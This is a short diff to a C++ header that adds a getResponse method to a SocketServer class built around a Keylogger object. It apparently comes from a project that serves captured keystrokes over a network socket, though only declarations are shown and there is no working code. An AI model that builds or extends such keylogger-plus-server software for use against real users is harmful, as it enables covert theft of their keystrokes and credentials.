@@ -19,6 +19,7 @@ private:
 public:
 	SocketServer(Keylogger* logger);
 	void start();
+	std::string getResponse(std::string request);
 	~SocketServer();
 };
 
